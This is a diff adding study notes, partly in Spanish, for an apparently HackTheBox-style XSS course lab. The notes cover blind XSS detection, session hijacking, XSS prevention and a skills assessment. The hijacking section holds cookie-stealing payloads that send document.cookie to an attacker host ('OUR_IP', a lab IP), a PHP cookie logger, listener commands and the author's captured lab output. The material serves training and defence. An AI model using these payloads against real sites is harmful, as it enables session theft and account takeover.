@@ -557,6 +557,270 @@ With the PHP server running, share the URL containing the XSS payload with victi
 #Ejercicio
   ##Try to find a working XSS payload for the Image URL form found at '/phishing' in the above server, and then use what you learned in this section to prepare a malicious URL that injects a malicious login form. Then visit '/phishing/send.php' to send the URL to the victim, and they will log into the malicious login form. If you did everything correctly, you should receive the victim's login credentials, which you can use to login to '/phishing/login.php' and obtain the flag.
 
-  
+  TOdo esta aqui: [https://ludvikkristoffersen.medium.com/htb-cross-site-scripting-xss-phishing-attack-task-ec8a0a88159f](url), no es tan dificil
+
+  Es seguir los pasos que sale en la room
 ---
 
+# Session Hijacking
+
+Modern web applications use cookies to maintain a user's session across browsing sessions. If an attacker obtains a user's cookie, they can hijack the session and gain access to the user's account without needing their credentials. By exploiting XSS vulnerabilities, attackers can steal cookies through a Session Hijacking attack.
+
+## Blind XSS Detection
+
+Blind XSS vulnerabilities are triggered on pages that attackers do not have access to, such as admin panels. Examples include:
+
+- Contact forms
+- Reviews
+- Support tickets
+- HTTP headers (e.g., User-Agent)
+
+To detect Blind XSS vulnerabilities, inject a JavaScript payload that sends an HTTP request to the attacker's server. If the payload executes, the attacker receives a request, confirming the vulnerability.
+
+### Loading a Remote Script
+
+Use the following payload to load a remote script:
+
+```html
+<script src="http://OUR_IP/username"></script>
+```
+
+This payload allows identifying which input field is vulnerable based on the request received. Test different fields by replacing `username` with the field name. Example payloads:
+
+```html
+<script src=http://OUR_IP/fullname></script>
+<script src=http://OUR_IP/username></script>
+```
+
+### Setting Up the Listener
+
+Start a listener on the attacker's server to capture requests:
+
+```bash
+mkdir /tmp/tmpserver
+cd /tmp/tmpserver
+sudo php -S 0.0.0.0:80
+```
+
+Test various fields with different payloads. Once a request is received, note the working payload and the vulnerable field.
+
+## Performing Session Hijacking
+
+After identifying the vulnerable input field, use a JavaScript payload to steal cookies and send them to the attacker's server. Example payloads:
+
+```javascript
+document.location='http://OUR_IP/index.php?c='+document.cookie;
+new Image().src='http://OUR_IP/index.php?c='+document.cookie;
+```
+
+The second payload is less suspicious as it adds an image instead of navigating to another page.
+
+### Hosting the Payload
+
+Save the payload in `script.js` on the attacker's server:
+
+```javascript
+new Image().src='http://OUR_IP/index.php?c='+document.cookie;
+```
+
+Change the XSS payload to use `script.js`:
+
+```html
+<script src=http://OUR_IP/script.js></script>
+```
+
+### Setting Up the PHP Script
+
+Write a PHP script to log cookies into a file:
+
+```php
+<?php
+if (isset($_GET['c'])) {
+    $list = explode(";", $_GET['c']);
+    foreach ($list as $key => $value) {
+        $cookie = urldecode($value);
+        $file = fopen("cookies.txt", "a+");
+        fputs($file, "Victim IP: {$_SERVER['REMOTE_ADDR']} | Cookie: {$cookie}\n");
+        fclose($file);
+    }
+}
+?>
+```
+
+Save this script as `index.php` and host it using the PHP server:
+
+```bash
+sudo php -S 0.0.0.0:80
+```
+
+### Capturing the Cookie
+
+When the victim triggers the XSS payload, their cookie will be sent to the attacker's server:
+
+```bash
+10.10.10.10:52798 [200]: /script.js
+10.10.10.10:52799 [200]: /index.php?c=cookie=f904f93c949d19d870911bf8b05fe7b2
+```
+
+The `cookies.txt` file will log the cookies:
+
+```bash
+cat cookies.txt
+Victim IP: 10.10.10.1 | Cookie: cookie=f904f93c949d19d870911bf8b05fe7b2
+```
+
+## Using the Stolen Cookie
+
+To hijack the session, use the stolen cookie on the login page:
+
+1. Navigate to `/hijacking/login.php`.
+2. Open the **Storage** tab in Developer Tools (Shift+F9 in Firefox).
+3. Add the stolen cookie:
+    - **Name**: The part before `=`.
+    - **Value**: The part after `=`.
+
+Refresh the page to access the victim's account.
+
+"><script src=http://10.10.15.137/url></script>
+"><script src=http://10.10.15.137/script.js></script>
+[Fri Jan 10 12:49:35 2025] 10.129.72.167:36732 [200]: GET /index.php?c=cookie=c00k1355h0u1d8353cu23d
+Agregamos la cookie y asi podemos obtener la flag
+
+---
+
+# XSS Prevention
+
+By now, we should have a good understanding of XSS vulnerabilities, their types, detection, and exploitation methods. This section focuses on defending against XSS vulnerabilities by addressing the **Source** (user input fields) and **Sink** (data display points) in both the front-end and back-end of web applications.
+
+## Front-End Prevention
+
+The front-end is where most user input originates, making it essential to sanitize and validate input using JavaScript.
+
+### Input Validation
+
+Use JavaScript to validate user input. For example, validating email formats:
+
+```javascript
+function validateEmail(email) {
+    const re = /^(([^<>()[\]\\.,;:\s@"]+(\.[^<>()[\]\\.,;:\s@"]+)*)|(".+"))@((\[[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\])|(([a-zA-Z\-0-9]+\.)+[a-zA-Z]{2,}))$/;
+    return re.test($("#login input[name=email]").val());
+}
+```
+
+### Input Sanitization
+
+Sanitize input by escaping special characters. Use libraries like **DOMPurify**:
+
+```javascript
+<script type="text/javascript" src="dist/purify.min.js"></script>
+let clean = DOMPurify.sanitize(dirty);
+```
+
+### Avoid Direct User Input
+
+Do not directly use user input in:
+
+- JavaScript code: `<script></script>`
+- CSS styles: `<style></style>`
+- HTML attributes: `<div name='INPUT'></div>`
+- HTML comments: `<!-- -->`
+
+Avoid functions that write raw HTML:
+
+- `DOM.innerHTML`, `DOM.outerHTML`
+- `document.write()`, `document.writeln()`
+- jQuery functions like `html()`, `add()`, `append()`, `prepend()`
+
+## Back-End Prevention
+
+Back-end measures are critical for preventing Stored and Reflected XSS vulnerabilities.
+
+### Input Validation
+
+Validate user input using Regex or libraries. For example, validating email input in PHP:
+
+```php
+if (filter_var($_GET['email'], FILTER_VALIDATE_EMAIL)) {
+    // Accept input
+} else {
+    // Reject input
+}
+```
+
+In Node.js, reuse front-end validation code.
+
+### Input Sanitization
+
+Sanitize user input to escape special characters. For example, in PHP:
+
+```php
+addslashes($_GET['email']);
+```
+
+In Node.js, use **DOMPurify**:
+
+```javascript
+import DOMPurify from 'dompurify';
+var clean = DOMPurify.sanitize(dirty);
+```
+
+### Output HTML Encoding
+
+Encode special characters in output to prevent injection. For example, in PHP:
+
+```php
+htmlentities($_GET['email']);
+```
+
+In Node.js, use libraries like **html-entities**:
+
+```javascript
+import encode from 'html-entities';
+encode('<'); // -> '&lt;'
+```
+
+### Server Configuration
+
+Enhance security with proper server settings:
+
+- Use **HTTPS** across the entire domain.
+- Add **XSS prevention headers**.
+- Set `X-Content-Type-Options=nosniff` to prevent MIME type sniffing.
+- Use **Content-Security-Policy** options like `script-src 'self'` to restrict script sources.
+- Set `HttpOnly` and `Secure` flags on cookies to prevent JavaScript access and ensure secure transmission.
+
+### Web Application Firewalls (WAF)
+
+Deploy a WAF to detect and block injection attempts. Some frameworks, such as ASP.NET, offer built-in XSS protection.
+
+## Conclusion
+
+Preventing XSS vulnerabilities requires a combination of front-end and back-end measures, including input validation, sanitization, encoding, server configurations, and WAFs. Even with these defenses, security gaps may remain. Regularly test for vulnerabilities using both offensive and defensive techniques to ensure robust protection against XSS attacks.
+
+
+# Skills Assessment
+
+We are performing a Web Application Penetration Testing task for a company that hired you, which just released their new Security Blog. In our Web Application Penetration Testing plan, we reached the part where you must test the web application against Cross-Site Scripting vulnerabilities (XSS).
+
+Start the server below, make sure you are connected to the VPN, and access the `/assessment` directory on the server using the browser:
+
+```
+http://SERVER_IP:PORT/assessment/
+```
+
+## Objectives
+
+1. **Identify a Vulnerable Input Field**
+   - Locate a user-input field that is vulnerable to XSS.
+   
+2. **Find a Working XSS Payload**
+   - Discover and use a payload that executes JavaScript code in the target's browser.
+
+3. **Perform Session Hijacking**
+   - Apply Session Hijacking techniques to steal the victim's cookies, which should contain the flag.
+
+Use the skills and techniques learned in this module to complete the assessment successfully.
+
+Ejercicio
+  What is the value of the 'flag' cookie?
+    Es lo mismo que el anterior 
